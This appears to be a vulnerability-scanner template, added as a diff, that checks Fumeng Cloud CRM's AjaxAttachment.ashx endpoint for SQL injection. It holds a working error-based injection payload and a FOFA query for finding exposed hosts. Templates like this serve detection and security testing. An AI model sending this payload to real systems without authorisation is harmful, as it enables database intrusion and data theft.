@@ -1,0 +1,33 @@
+id: fumeng-cloud-crm-ajaxattachment-sqli
+
+info:
+  name: 孚盟云CRM AjaxAttachment.ashx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+        上海孚盟软件有限公司开发的外贸SaaS产品孚盟云中，AjaxAttachment.ashx接口存在SQL注入安全缺陷。攻击者可通过构造恶意SQL查询实现数据库信息泄露（如管理员凭证、用户数据）及服务器控制。在具备高权限访问条件下，可利用该漏洞部署恶意代码，导致系统权限被完全接管。
+  tags: 孚盟云CRM
+
+http:
+- raw:
+  - |
+    GET /m/Dingding/Ajax/AjaxAttachment.ashx?method=saveAttach&MouldID=1'and+1<@@version-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+    - type: status
+      status:
+        - 500
+    - type: word
+      part: body
+      words:
+        - "Microsoft SQL Server"
+        - "SqlException:"
+        - ".GetMblIsRepeat"
+    - type: regex
+      part: body
+      regex:
+        - "转换成数据类型(.*?)时失败"
+        - "在将(.*?)值"
+
